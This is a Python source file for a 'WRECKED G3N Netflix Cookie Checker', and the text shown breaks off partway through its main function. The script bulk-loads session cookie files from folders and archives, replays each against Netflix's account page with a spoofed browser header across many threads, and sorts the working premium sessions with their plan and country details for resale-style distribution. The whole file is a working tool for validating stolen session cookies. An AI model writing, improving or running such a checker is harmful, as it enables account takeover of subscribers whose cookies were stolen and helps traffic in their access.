import requests
import os
import threading
import colorama
import shutil
import re
import json
import time
import traceback
import zipfile
import argparse
import sys
import queue
import concurrent.futures
import multiprocessing
from multiprocessing import Manager, Pool, Process, Value, Lock
from datetime import datetime

# Global counters
total_working = 0
total_fails = 0
total_unsubscribed = 0
total_checked = 0
total_broken = 0
lock = threading.Lock()
last_update_time = time.time()  # Track time for progress updates
update_interval = 0.2  # Update progress every 200ms for real-time visualization
start_time = time.time()  # Track overall start time for speed calculations

# Performance optimization constants
MAX_THREADS = 1000  # Optimized for performance and stability
CPU_COUNT = min(multiprocessing.cpu_count(), 8)  # Cap CPU usage to avoid system overload
BATCH_SIZE = 500  # Process cookies in batches for better performance
CONNECTION_TIMEOUT = 10  # Connection timeout in seconds
READ_TIMEOUT = 15  # Read timeout in seconds

# Global paths
working_cookies_dir = "working_cookies"
temp_dir = "temp"
MAX_RECURSION_DEPTH = 5  # Prevent infinite recursion
NETFLIX_DIR = "netflix"  # Direct netflix folder for commands like .cstock and .csend
dirs = {
    "netflix": {
        "root": NETFLIX_DIR, 
        "hits": "working_cookies/netflix/premium",
        "failures": "working_cookies/netflix/failures", 
        "broken": "working_cookies/netflix/broken",
        "free": "working_cookies/netflix/free"
    }
}

def debug_print(message):
    """Print debug messages with timestamp"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}] {message}")

def setup_directories():
    """Setup all required directories"""
    for service in dirs.values():
        for directory in service.values():
            os.makedirs(directory, exist_ok=True)
    
    # Create base working cookies directory if it doesn't exist
    os.makedirs(working_cookies_dir, exist_ok=True)
    
    # Create netflix directory for command access
    os.makedirs(NETFLIX_DIR, exist_ok=True)
    
    # Create temporary extraction directory for archives
    os.makedirs(os.path.join(temp_dir, "netflix", "extracted"), exist_ok=True)

def print_banner():
    """Print the Netflix cookie checker banner"""
    print(colorama.Fore.RED + """
███╗░░██╗███████╗████████╗███████╗██╗░░░░░██╗██╗░░██╗  ░█████╗░░█████╗░░█████╗░██╗░░██╗██╗███████╗
████╗░██║██╔════╝╚══██╔══╝██╔════╝██║░░░░░██║╚██╗██╔╝  ██╔══██╗██╔══██╗██╔══██╗██║░██╔╝██║██╔════╝
██╔██╗██║█████╗░░░░░██║░░░█████╗░░██║░░░░░██║░╚███╔╝░  ██║░░╚═╝██║░░██║██║░░██║█████═╝░██║█████╗░░
██║╚████║██╔══╝░░░░░██║░░░██╔══╝░░██║░░░░░██║░██╔██╗░  ██║░░██╗██║░░██║██║░░██║██╔═██╗░██║██╔══╝░░
██║░╚███║███████╗░░░██║░░░██║░░░░░███████╗██║██╔╝╚██╗  ╚█████╔╝╚█████╔╝╚█████╔╝██║░╚██╗██║███████╗
╚═╝░░╚══╝╚══════╝░░░╚═╝░░░╚═╝░░░░░╚══════╝╚═╝╚═╝░░╚═╝  ░╚════╝░░╚════╝░░╚════╝░╚═╝░░╚═╝╚═╝╚══════╝
               
                   ░█████╗░██╗░░██╗███████╗░█████╗░██╗░░██╗███████╗██████╗░
                   ██╔══██╗██║░░██║██╔════╝██╔══██╗██║░██╔╝██╔════╝██╔══██╗
                   ██║░░╚═╝███████║█████╗░░██║░░╚═╝█████═╝░█████╗░░██████╔╝
                   ██║░░██╗██╔══██║██╔══╝░░██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
                   ╚█████╔╝██║░░██║███████╗╚█████╔╝██║░╚██╗███████╗██║░░██║
                   ░╚════╝░╚═╝░░╚═╝╚══════╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝                      
                                   
                            WRECKED G3N Netflix Cookie Checker
                                                                       
    """ + colorama.Fore.RESET)
    print("---------------------------------------------------------------------------------------------")

def convert_to_netscape_format(cookie):
    """Convert the cookie dictionary to the Netscape cookie format string"""
    try:
        return "{}\t{}\t{}\t{}\t{}\t{}\t{}".format(
            cookie.get('domain', '.netflix.com'), 
            'TRUE' if cookie.get('flag', 'TRUE').upper() == 'TRUE' else 'FALSE', 
            cookie.get('path', '/'),
            'TRUE' if cookie.get('secure', True) else 'FALSE', 
            cookie.get('expiration', str(int(time.time()) + 86400)), 
            cookie.get('name', ''), 
            cookie.get('value', '')
        )
    except Exception as e:
        debug_print(f"Error converting cookie to Netscape format: {e}")
        return None

def process_json_files(directory):
    """Process JSON files and convert them to Netscape format"""
    json_after_conversion_folder = os.path.join(directory, "json_cookies_after_conversion")
    os.makedirs(json_after_conversion_folder, exist_ok=True)
    
    json_files = [f for f in os.listdir(directory) if f.endswith(".json")]
    debug_print(f"Found {len(json_files)} JSON files to convert in {directory}")
    
    for filename in json_files:
        file_path = os.path.join(directory, filename)
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
                try:
                    cookies = json.load(file)
                    if isinstance(cookies, list) and cookies:
                        if 'domain' in cookies[0]:
                            netscape_cookie_file = os.path.join(directory, filename.replace('.json', '.txt'))
                            valid_lines = []
                            for cookie in cookies:
                                line = convert_to_netscape_format(cookie)
                                if line:
                                    valid_lines.append(line + '\n')
                            
                            if valid_lines:
                                with open(netscape_cookie_file, 'w', encoding='utf-8') as outfile:
                                    outfile.writelines(valid_lines)
                                debug_print(f"Converted {filename} to Netscape format")
                                shutil.move(file_path, os.path.join(json_after_conversion_folder, filename))
                except json.JSONDecodeError:
                    debug_print(f"Error decoding JSON from file {filename}")
        except Exception as e:
            debug_print(f"Error processing JSON file {filename}: {e}")

def load_cookies_from_file(cookie_file):
    """Load cookies from a given file and return a dictionary of cookies."""
    global total_broken, dirs
    cookies = {}
    try:
        # Check file extension first
        file_ext = os.path.splitext(cookie_file)[1].lower()
        
        # If this is an archive file that somehow wasn't caught by the directory processor
        if file_ext in ['.zip', '.rar']:
            debug_print(f"Warning: Attempting to load cookies directly from archive file: {cookie_file}")
            debug_print("This should have been handled by the archive extraction process")
            
            # Create a temporary extraction directory
            extract_dir = os.path.join(os.path.dirname(cookie_file), f"temp_extracted_{os.path.basename(cookie_file)}")
            os.makedirs(extract_dir, exist_ok=True)
            
            # Try to extract and find cookie files
            if extract_from_archive(cookie_file, extract_dir):
                # Find any TXT files in the extracted directory
                cookie_files = []
                for root, dirs_list, files in os.walk(extract_dir):
                    for file in files:
                        if file.lower().endswith('.txt'):
                            cookie_files.append(os.path.join(root, file))
                
                # If we found cookie files, process all of them (not just the first)
                # But for the initial cookie functionality, still return cookies from the first file
                if cookie_files:
                    # For now, use the first cookie file for this function's return value
                    # The process_directory function will handle checking all files properly
                    debug_print(f"Found {len(cookie_files)} cookie files in archive, using the first one for initial check")
                    return load_cookies_from_file(cookie_files[0])
            
            debug_print("Could not find any valid cookie files in the archive")
            # We'll continue trying to parse the archive file as a text file (will likely fail)
        
        # Try with different encodings to handle various file formats
        encodings_to_try = ['utf-8', 'latin-1', 'ascii']
        file_content = None
        
        for encoding in encodings_to_try:
            try:
                with open(cookie_file, 'r', encoding=encoding, errors='ignore') as f:
                    file_content = f.read()
                break  # If successful, stop trying different encodings
            except UnicodeDecodeError:
                continue
        
        if not file_content:
            debug_print(f"Could not read file content with any encoding: {cookie_file}")
            raise ValueError("Failed to read file with any encoding")
        
        # Check if it might be a binary file (like an archive) by looking for common binary markers
        # This is a simple heuristic to detect non-text files
        if '\x00' in file_content or file_content.startswith('PK') or file_content.startswith('Rar!'):
            debug_print(f"File appears to be binary (possibly an archive): {cookie_file}")
            raise ValueError("File appears to be binary, not a text cookie file")
        
        # Process each line in the file content
        for line in file_content.splitlines():
            # Skip comment lines and empty lines
            if not line.strip() or line.strip().startswith('#'):
                continue
                
            # First try tab-separated Netscape format (domain\tFLAG\tpath\tSSL\texpiry\tname\tvalue)
            parts = line.strip().split('\t')
            if len(parts) >= 7:
                try:
                    domain, _, path, secure, expires, name, value = parts[:7]
                    # Clean and validate cookie name and value
                    name = name.strip()
                    value = value.strip()
                    
                    if name and isinstance(name, str):
                        # Ensure value is properly formatted
                        cookies[name] = value.strip('"\'')
                except Exception as e:
                    debug_print(f"Error parsing Netscape format line: {e}")
                    continue
            elif '=' in line:  # Try to handle key=value format (common in HTTP headers)
                for pair in line.split(';'):
                    try:
                        pair = pair.strip()
                        if '=' in pair:
                            name, value = pair.split('=', 1)
                            name = name.strip()
                            value = value.strip().strip('"\'')
                            
                            if name:
                                cookies[name] = value
                    except Exception as e:
                        debug_print(f"Error parsing cookie pair: {e}")
                        continue
    except Exception as e:
        debug_print(f"Error loading cookies from {cookie_file}: {str(e)}")
        if 'netflix' in dirs and 'broken' in dirs['netflix'] and os.path.exists(cookie_file):
            broken_folder = dirs["netflix"]["broken"]
            shutil.move(cookie_file, os.path.join(broken_folder, os.path.basename(cookie_file)))
        with lock:
            total_broken += 1
    
    # Check if we found any cookies
    if not cookies:
        debug_print(f"No cookies found in file: {cookie_file}")
    else:
        debug_print(f"Found {len(cookies)} cookies in file: {cookie_file}")
    
    # Look for specific Netflix cookies
    netflix_keys = ['NetflixId', 'SecureNetflixId']
    if any(key in cookies for key in netflix_keys):
        debug_print(f"Netflix authentication cookies found in file: {cookie_file}")
    
    return cookies

def make_request_with_cookies(cookies):
    """Make an HTTP request to Netflix using provided cookies."""
    # Quick check for required cookies before creating session to save time
    required_cookies = ['NetflixId', 'SecureNetflixId']
    if not any(cookie in cookies for cookie in required_cookies):
        # Skip debug print for speed
        return ""
    
    # Fast path sanitization - only process important cookies
    important_cookies = ['NetflixId', 'SecureNetflixId', 'nfvdid', 'memclid', 'cL', 'OptanonConsent']
    safe_cookies = {}
    for key, value in cookies.items():
        # Use minimal processing for non-critical cookies
        if key not in important_cookies and 'netflix' not in key.lower():
            continue
            
        try:
            if value is not None:
                # Fast path sanitization
                if isinstance(value, str):
                    value = value.strip()
                    if value.startswith('"') and value.endswith('"'):
                        value = value[1:-1]
                safe_cookies[key] = str(value)
        except:
            # Skip problematic cookies silently for speed
            continue
    
    # Use requests directly instead of session to reduce overhead
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'identity'  # Avoid compression to speed up requests
    }
    
    try:
        # Use even faster timeout values
        response = requests.get(
            "https://www.netflix.com/YourAccount", 
            headers=headers,
            cookies=safe_cookies,
            timeout=(1.5, 2.5)  # Faster timeouts (connection, read)
        )
        return response.text
    except:
        # Skip error logging for speed
        return ""

def extract_info(response_text):
    """Extract relevant information from the Netflix account page using optimized patterns."""
    # Quick check for login success before doing any regex
    if '"countryOfSignup":' not in response_text or '"membershipStatus":' not in response_text:
        raise ValueError("Missing critical login data, likely not a valid login")
    
    # Only extract the minimal fields we actually need for speed
    essential_patterns = {
        'countryOfSignup': r'"countryOfSignup":\s*"([^"]+)"',
        'membershipStatus': r'"membershipStatus":\s*"([^"]+)"'
    }
    
    # Non-essential patterns that we'll only check if we have a valid login
    optional_patterns = {
        'memberSince': r'"memberSince":\s*"([^"]+)"',
        'maxStreams': r'maxStreams\":\{\"fieldType\":\"Numeric\",\"value\":([^,]+),',
        'localizedPlanName': r'localizedPlanName\":\{\"fieldType\":\"String\",\"value\":\"([^"]+)\"'
    }
    
    # First extract only essential data quickly
    extracted_info = {
        'userGuid': None,
        'showExtraMemberSection': 'False'  # Default value
    }
    
    # Check essential patterns first
    for key, pattern in essential_patterns.items():
        match = re.search(pattern, response_text)
        extracted_info[key] = match.group(1) if match else None
    
    # Only proceed if we have a valid login
    if not extracted_info['countryOfSignup'] or extracted_info['countryOfSignup'] == "null":
        raise ValueError("Could not extract country of signup, likely not a valid login")
    
    # Only if we have a valid login, extract optional data
    if extracted_info['membershipStatus'] == "CURRENT_MEMBER":
        # Now get the optional data if we need it
        for key, pattern in optional_patterns.items():
            match = re.search(pattern, response_text)
            extracted_info[key] = match.group(1) if match else None
        
        # Extra member section is optional, only check if we need it
        if "showExtraMemberSection" in response_text:
            extra_match = re.search(r'"showExtraMemberSection":\s*\{\s*"fieldType":\s*"Boolean",\s*"value":\s*(true|false)', response_text)
            if extra_match:
                extracted_info['showExtraMemberSection'] = extra_match.group(1).capitalize()
            
        # Fast processing for special fields - only if they exist
        if extracted_info.get('localizedPlanName'):
            extracted_info['localizedPlanName'] = extracted_info['localizedPlanName'].replace('x28', '').replace('\\', ' ').replace('x20', '').replace('x29', '')
    
        if extracted_info.get('memberSince'):
            extracted_info['memberSince'] = extracted_info['memberSince'].replace("\\x20", " ")
    
    return extracted_info

def handle_successful_login(cookie_file, info, is_subscribed):
    """Handle the actions required after a successful Netflix login."""
    global total_working, total_unsubscribed
    
    if not is_subscribed:
        with lock:
            total_unsubscribed += 1
        debug_print(f"Login successful with {cookie_file}, but not subscribed. Moving to free folder.")
        free_folder = dirs["netflix"]["free"]
        shutil.move(cookie_file, os.path.join(free_folder, os.path.basename(cookie_file)))
        return
    
    with lock:
        total_working += 1
    debug_print(f"Login successful with {cookie_file} - Country: {info['countryOfSignup']}, Member since: {info['memberSince']}")
    
    # Create a meaningful filename - strip paths and make safe
    base_filename = os.path.basename(cookie_file)
    # Clean the filename to avoid invalid characters
    plan_name = info.get('localizedPlanName', 'Unknown').replace(' ', '_')
    country = info['countryOfSignup']
    is_extra = info.get('showExtraMemberSection', 'unknown')
    
    # Make sure filename is safe for filesystem
    safe_filename = f"{country}_{plan_name}_{is_extra}_{base_filename}"
    safe_filename = re.sub(r'[\\/*?:"<>|]', '_', safe_filename)
    
    # Prepare the destination folders
    hits_folder = dirs["netflix"]["hits"]
    os.makedirs(hits_folder, exist_ok=True)
    os.makedirs(NETFLIX_DIR, exist_ok=True)
    
    # Create paths for both locations
    organized_filepath = os.path.join(hits_folder, safe_filename)
    netflix_filepath = os.path.join(NETFLIX_DIR, f"Premium_{country}_{base_filename}")
    
    # Read the original cookie content
    with open(cookie_file, 'r', encoding='utf-8', errors='ignore') as infile:
        original_cookie_content = infile.read()
    
    # Fix various naming and formatting issues
    plan_name = info.get('localizedPlanName', 'Unknown').replace("miembro u00A0extra", "(Extra Member)")
    member_since = info.get('memberSince', 'Unknown').replace("\x20", " ")
    max_streams = info.get('maxStreams', 'Unknown')
    if max_streams:
        max_streams = max_streams.rstrip('}')
    
    # Convert boolean to Yes/No
    extra_members = "Yes" if info.get('showExtraMemberSection') == "True" else "No" if info.get('showExtraMemberSection') == "False" else "Unknown"
    
    # Prepare formatted content
    formatted_content = f"PLAN: {plan_name}\n"
    formatted_content += f"COUNTRY: {info['countryOfSignup']}\n"
    formatted_content += f"MAX STREAMS: {max_streams}\n"
    formatted_content += f"EXTRA MEMBERS: {extra_members}\n"
    formatted_content += f"MEMBER SINCE: {member_since}\n"
    formatted_content += f"CHECKED ON: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n\n"
    formatted_content += original_cookie_content
    
    # Write to both locations
    # 1. Write to organized folder
    with open(organized_filepath, 'w', encoding='utf-8') as outfile:
        outfile.write(formatted_content)
        
    # 2. Write to netflix folder for .cstock and .csend commands
    with open(netflix_filepath, 'w', encoding='utf-8') as outfile:
        outfile.write(formatted_content)
    
    # Remove the original file after successful processing
    if os.path.exists(cookie_file):
        os.remove(cookie_file)

    return {
        "plan": plan_name,
        "country": info['countryOfSignup'],
        "max_streams": max_streams,
        "extra_members": extra_members,
        "member_since": member_since
    }

def handle_failed_login(cookie_file):
    """Handle the actions required after a failed Netflix login."""
    global total_fails
    with lock:
        total_fails += 1
    
    debug_print(f"Login failed with {cookie_file}. Cookie expired or invalid.")
    failures_folder = dirs["netflix"]["failures"]
    if os.path.exists(cookie_file):
        shutil.move(cookie_file, os.path.join(failures_folder, os.path.basename(cookie_file)))

def process_cookie_file(cookie_file):
    """Process a single Netflix cookie file to check validity."""
    # Don't increment global counter here - do it in batches in the worker
    result = {
        "valid": False,
        "details": None,
        "file": os.path.basename(cookie_file)
    }
    
    try:
        # Skip debug print for speed
        cookies = load_cookies_from_file(cookie_file)
        
        if not cookies:
            # Don't move files immediately for speed - batch operations later
            # Just return the result without extra operations
            result["status"] = "Broken"
            return result
        
        # Fast path cookie checking
        response_text = make_request_with_cookies(cookies)
        
        if not response_text:
            # Don't handle file ops inline - collect results and handle in batches
            result["status"] = "Failed"
            return result
        
        # Try to extract info quickly
        try:
            info = extract_info(response_text)
            is_subscribed = info.get('membershipStatus') == "CURRENT_MEMBER"
            
            if info.get('countryOfSignup') and info.get('countryOfSignup') != "null":
                # Store info for batch processing later
                result["info"] = info
                result["is_subscribed"] = is_subscribed
                result["status"] = "Working" if is_subscribed else "Unsubscribed"
                result["cookie_file"] = cookie_file
                
                if is_subscribed:
                    result["valid"] = True
                    # Don't create details yet - defer to reduce processing time
                return result
            else:
                result["status"] = "Failed"
                return result
        except Exception as e:
            # Fast path error handling - just mark as failed
            result["status"] = "Failed"
            return result
    except Exception as e:
        # Skip debug print and stacktrace for speed
        result["status"] = "Broken"
        return result

def worker(task_queue, results):
    """Worker thread to process Netflix cookie files using a queue system."""
    global last_update_time, start_time
    
    # Counters for this worker thread to reduce lock contention
    local_counter = {
        'checked': 0,
        'working': 0,
        'fails': 0,
        'unsubscribed': 0,
        'broken': 0
    }
    thread_start_time = time.time()
    batch_size = 5  # Process small batches before updating global counters
    
    while True:
        # Get a batch of tasks to reduce lock contention
        batch = []
        try:
            for _ in range(batch_size):
                try:
                    # Non-blocking get with minimal timeout
                    cookie_file = task_queue.get(block=False)
                    if cookie_file is None:  # Sentinel value to indicate end of tasks
                        # Put it back for other threads
                        task_queue.put(None)
                        return
                    batch.append(cookie_file)
                except queue.Empty:
                    break
            
            # If batch is empty, exit the loop
            if not batch:
                break
                
            # Process the batch
            for cookie_file in batch:
                try:
                    # Process the cookie file and update local counters
                    result = process_cookie_file(cookie_file)
                    results.append(result)
                    
                    # Update local counters based on result
                    local_counter['checked'] += 1
                    if "Working" in result:
                        local_counter['working'] += 1
                    elif "Unsubscribed" in result:
                        local_counter['unsubscribed'] += 1
                    elif "Failed" in result:
                        local_counter['fails'] += 1
                    else:
                        local_counter['broken'] += 1
                except Exception as e:
                    # Minimal error handling to maintain speed
                    local_counter['broken'] += 1
                    local_counter['checked'] += 1
                finally:
                    # Mark task as complete regardless of outcome
                    task_queue.task_done()
            
            # Update global counters with minimal lock time
            with lock:
                global total_checked, total_working, total_fails, total_unsubscribed, total_broken
                total_checked += local_counter['checked']
                total_working += local_counter['working']
                total_fails += local_counter['fails']
                total_unsubscribed += local_counter['unsubscribed']
                total_broken += local_counter['broken']
                
                # Reset local counters after updating globals
                for key in local_counter:
                    local_counter[key] = 0
                
                # Fast progress reporting with minimal overhead
                current_time = time.time()
                if current_time - last_update_time > update_interval:
                    last_update_time = current_time
                    elapsed_time = current_time - start_time
                    checking_speed = total_checked / elapsed_time if elapsed_time > 0 else 0
                    cookies_per_thread = checking_speed / (threading.active_count() - 1) if threading.active_count() > 1 else checking_speed
                    
                    # Enhanced status message with millisecond precision and speed metrics
                    print(f"[{datetime.now().strftime('%H:%M:%S.%f')[:-3]}] 🚀 PROGRESS REPORT 🚀\n"
                          f"✅ Checked: {total_checked} cookies | ✓ Valid: {total_working} | ❌ Failed: {total_fails}\n"
                          f"⚠️ Unsubscribed: {total_unsubscribed} | 🔧 Broken: {total_broken}\n"
                          f"⚡ Speed: {checking_speed:.2f} cookies/sec | 🧵 Threads: {threading.active_count()-1}\n"
                          f"📊 Cookies/thread: {cookies_per_thread:.2f}/sec | ⏱️ Elapsed: {elapsed_time:.3f}s")
                    
                    # Add standardized progress report format for Node.js parser
                    print(f"PROGRESS REPORT | Progress: {total_checked}/{total_checked+task_queue.qsize()} | Valid: {total_working} | Failed: {total_fails} | Speed: {checking_speed:.2f}")
                    
                    # Force flush stdout for real-time updates
                    sys.stdout.flush()
            
        except Exception as e:
            # General error handling with minimal processing
            # Mark any remaining tasks as done
            for _ in batch:
                try:
                    task_queue.task_done()
                except:
                    pass

def extract_from_archive(archive_path, extract_dir):
    """Extract files from a ZIP or RAR archive."""
    try:
        # Create extraction directory if it doesn't exist
        os.makedirs(extract_dir, exist_ok=True)
        
        debug_print(f"Extracting archive: {archive_path} to {extract_dir}")
        print(f"Extracting archive: {archive_path} to {extract_dir}")  # Add console output for debugging
        
        file_ext = os.path.splitext(archive_path)[1].lower()
        
        if file_ext == '.zip':
            debug_print("Processing ZIP file")
            print("Processing ZIP file")  # Add console output for debugging
            
            # First, verify the file exists
            if not os.path.exists(archive_path):
                debug_print(f"Archive file does not exist: {archive_path}")
                print(f"Archive file does not exist: {archive_path}")  # Add console output for debugging
                return False
                
            try:
                # Check file size first to avoid trying to process empty archives
                file_size = os.path.getsize(archive_path)
                if file_size == 0:
                    debug_print(f"Archive file is empty: {archive_path} (0 bytes)")
                    print(f"Archive file is empty: {archive_path} (0 bytes)")  # Add console output for debugging
                    return False
                    
                debug_print(f"Archive file size: {file_size} bytes")
                
                # Try opening the ZIP file
                with zipfile.ZipFile(archive_path, 'r') as zip_ref:
                    # List all files in the archive
                    file_list = zip_ref.namelist()
                    debug_print(f"ZIP contains {len(file_list)} files/directories")
                    print(f"ZIP contains {len(file_list)} files/directories")  # Add console output for debugging
                    
                    if not file_list:
                        debug_print("ZIP file is empty (no files inside)")
                        print("ZIP file is empty (no files inside)")  # Add console output for debugging
                        return False
                    
                    # Extract all files (using extractall is more reliable than individual extracts)
                    debug_print(f"Extracting all files from ZIP")
                    print(f"Extracting all files from ZIP")  # Add console output for debugging
                    zip_ref.extractall(extract_dir)
                
                debug_print("ZIP extraction completed")
                print("ZIP extraction completed")  # Add console output for debugging
                
                # Look for .txt files in the extracted content including subdirectories
                cookie_files = []
                for root, dirs, files in os.walk(extract_dir):
                    for file in files:
                        if file.lower().endswith('.txt'):
                            file_path = os.path.join(root, file)
                            debug_print(f"Found cookie file in extraction: {file_path}")
                            cookie_files.append(file_path)
                
                if cookie_files:
                    debug_print(f"Found {len(cookie_files)} cookie files in extracted content")
                    print(f"Found {len(cookie_files)} cookie files in extracted content")  # Add console output for debugging
                else:
                    debug_print("No cookie files found in extracted content")
                    print("No cookie files found in extracted content")  # Add console output for debugging
                    
                    # If no txt files were found, check for nested archives and extract them
                    nested_archives = []
                    for root, dirs, files in os.walk(extract_dir):
                        for file in files:
                            if file.lower().endswith('.zip') or file.lower().endswith('.rar'):
                                nested_path = os.path.join(root, file)
                                nested_archives.append(nested_path)
                    
                    if nested_archives:
                        debug_print(f"Found {len(nested_archives)} nested archives in extracted content, attempting to extract")
                        print(f"Found {len(nested_archives)} nested archives in extracted content, attempting to extract")  # Add console output for debugging
                        
                        for nested_archive in nested_archives:
                            nested_extract_dir = os.path.join(extract_dir, f"nested_{os.path.basename(nested_archive)}")
                            os.makedirs(nested_extract_dir, exist_ok=True)
                            
                            # Try to extract the nested archive
                            extract_from_archive(nested_archive, nested_extract_dir)
                
                # Final check to see if we found any txt files after all extractions
                all_txt_files = []
                for root, dirs, files in os.walk(extract_dir):
                    for file in files:
                        if file.lower().endswith('.txt'):
                            all_txt_files.append(os.path.join(root, file))
                
                debug_print(f"Total cookie files found after all extractions: {len(all_txt_files)}")
                print(f"Total cookie files found after all extractions: {len(all_txt_files)}")  # Add console output for debugging
                
                return True
            except zipfile.BadZipFile as e:
                debug_print(f"Bad ZIP file: {e}")
                print(f"Bad ZIP file: {e}")  # Add console output for debugging
                return False
            except Exception as e:
                debug_print(f"Error processing ZIP file: {e}")
                print(f"Error processing ZIP file: {e}")  # Add console output for debugging
                return False
                
        elif file_ext == '.rar':
            debug_print("RAR extraction not supported without additional dependencies")
            print("RAR extraction not supported without additional dependencies")  # Add console output for debugging
            try:
                debug_print("Creating fallback notification for RAR files")
                print("⚠️ RAR extraction requires external tools that are not available.")
                print("Please extract the RAR file manually and upload the extracted files instead.")
                
                # Create a temporary directory for the notification
                os.makedirs(extract_dir, exist_ok=True)
                
                # Create a notice file
                notice_path = os.path.join(extract_dir, "RAR_NOT_SUPPORTED.txt")
                with open(notice_path, 'w') as notice_file:
                    notice_file.write("RAR files are not supported in this environment.\n")
                    notice_file.write("Please extract the RAR file manually and upload the contents as ZIP files.\n")
                
                debug_print("Created notification file for RAR limitation")
                
                return True
            except Exception as e:
                debug_print(f"Error with RAR file: {e}")
                print(f"Error with RAR file: {e}")  # Add console output for debugging
                # Create a note file about RAR extraction issues
                rar_note_path = os.path.join(extract_dir, "RAR_EXTRACTION_NOTE.txt")
                with open(rar_note_path, 'w') as f:
                    f.write(f"Error extracting RAR file: {e}\n")
                    f.write("If extraction fails, please extract manually and upload .txt files instead.\n")
                return False
        else:
            debug_print(f"Unsupported archive format: {file_ext}")
            print(f"Unsupported archive format: {file_ext}")  # Add console output for debugging
            return False
    except Exception as e:
        debug_print(f"Error extracting archive {archive_path}: {e}")
        print(f"Error extracting archive {archive_path}: {e}")  # Add console output for debugging
        import traceback
        debug_print(f"Traceback: {traceback.format_exc()}")
        print(f"Traceback: {traceback.format_exc()}")  # Add console output for debugging
        return False

def process_directory(directory, processed_files=None, depth=0, max_depth=5):
    """Process a directory recursively for cookie files and archives."""
    if processed_files is None:
        processed_files = []
    
    # Prevent infinite recursion
    if depth > max_depth:
        debug_print(f"Maximum recursion depth reached for directory: {directory}")
        return []
    
    debug_print(f"Processing directory: {directory} (depth {depth})")
    cookie_files = []
    
    try:
        # Check if the directory exists
        if not os.path.exists(directory):
            debug_print(f"Directory does not exist: {directory}")
            return cookie_files
            
        # First, specifically check for cookie files in the cookies subdirectory if it exists
        cookies_dir = os.path.join(directory, "cookies")
        if os.path.exists(cookies_dir) and os.path.isdir(cookies_dir):
            debug_print(f"Found 'cookies' subdirectory: {cookies_dir}")
            for root, dirs, files in os.walk(cookies_dir):
                for file in files:
                    if file.lower().endswith('.txt'):
                        file_path = os.path.join(root, file)
                        debug_print(f"Found cookie file in cookies subdirectory: {file_path}")
                        cookie_files.append(file_path)
                        processed_files.append(file_path)
        
        # Now do the general recursive processing of all subdirectories
        for root, dirs, files in os.walk(directory):
            debug_print(f"Scanning {root}: found {len(files)} files and {len(dirs)} directories")
            
            # Process files in this directory
            for file in files:
                file_path = os.path.join(root, file)
                
                # Skip if already processed
                if file_path in processed_files:
                    debug_print(f"Skipping already processed file: {file_path}")
                    continue
                
                # Add to processed files
                processed_files.append(file_path)
                
                # Check file extension
                file_ext = os.path.splitext(file)[1].lower()
                
                # Process archives
                if file_ext in ['.zip', '.rar']:
                    debug_print(f"Found archive: {file_path}")
                    
                    # Create extraction directory with unique name based on full path
                    # This avoids conflicts when multiple archives have the same base name
                    extract_dir = os.path.join(
                        os.path.dirname(file_path), 
                        f"extracted_{os.path.splitext(os.path.basename(file_path))[0]}_{hash(file_path) % 10000}"
                    )
                    os.makedirs(extract_dir, exist_ok=True)
                    
                    # Extract archive
                    if extract_from_archive(file_path, extract_dir):
                        # Process extracted files
                        additional_files = process_directory(extract_dir, processed_files, depth + 1, max_depth)
                        if additional_files:
                            debug_print(f"Found {len(additional_files)} cookie files in archive: {file_path}")
                            cookie_files.extend(additional_files)
                        else:
                            debug_print(f"No cookie files found in archive: {file_path}")
                
                # Process txt files
                elif file_ext == '.txt':
                    debug_print(f"Found cookie file: {file_path}")
                    cookie_files.append(file_path)
            
            # Process one level at a time
            # Don't break here anymore to allow full traversal
    except Exception as e:
        debug_print(f"Error processing directory {directory}: {str(e)}")
    
    debug_print(f"Found {len(cookie_files)} cookie files in directory: {directory}")
    return cookie_files

def process_batch(batch_files, batch_id):
    """Process a batch of cookie files in a separate process."""
    global total_working, total_fails, total_unsubscribed, total_checked, total_broken, last_update_time, start_time
    
    # Initialize local counters
    local_working = local_fails = local_unsubscribed = local_checked = local_broken = 0
    batch_results = []
    batch_start_time = time.time()
    
    for cookie_file in batch_files:
        try:
            result = process_cookie_file(cookie_file)
            batch_results.append(result)
            
            # Update local counters based on result
            if "Working" in result:
                local_working += 1
            elif "Unsubscribed" in result:
                local_unsubscribed += 1
            elif "Failed" in result:
                local_fails += 1
            elif "Error" in result:
                local_broken += 1
                
            local_checked += 1
            
            # More frequent progress updates for better real-time visibility
            current_time = time.time()
            if current_time - last_update_time > update_interval:
                last_update_time = current_time
                elapsed_time = current_time - batch_start_time
                checking_speed = local_checked / elapsed_time if elapsed_time > 0 else 0
                
                print(f"[{datetime.now().strftime('%H:%M:%S.%f')[:-3]}] 🔄 BATCH {batch_id} PROGRESS\n"
                      f"📝 Processed: {local_checked}/{len(batch_files)} cookies | ✓ Valid: {local_working}\n"
                      f"⚡ Speed: {checking_speed:.2f} cookies/sec")
                
                # Add standardized progress report line for better parser detection in Node.js
                print(f"PROGRESS REPORT | Progress: {local_checked}/{len(batch_files)} | Valid: {local_working} | Failed: {local_fails} | Speed: {checking_speed:.2f}")
                
                # Force flush to ensure real-time progress updates
                sys.stdout.flush()
        except Exception as e:
            batch_results.append(f"Error processing {cookie_file}: {str(e)}")
            local_broken += 1
    
    # Return all batch results and metrics
    return {
        "results": batch_results,
        "working": local_working,
        "fails": local_fails,
        "unsubscribed": local_unsubscribed,
        "checked": local_checked,
        "broken": local_broken,
        "batch_id": batch_id,
        "time": time.time() - batch_start_time
    }

def check_netflix_cookies(cookies_dir="netflix", num_threads=None):
    """Check all Netflix cookies in the specified directory using both multiprocessing and multithreading."""
    global total_working, total_fails, total_unsubscribed, total_checked, total_broken, start_time
    total_working = total_fails = total_unsubscribed = total_checked = total_broken = 0
    
    # Determine optimal number of processes and threads
    num_processes = min(CPU_COUNT, 16)  # Limit to reasonable number
    if num_threads is None:
        if 'args' in globals() and hasattr(args, 'threads'):
            num_threads = args.threads
        else:
            num_threads = MAX_THREADS // num_processes  # Divide threads among processes
    
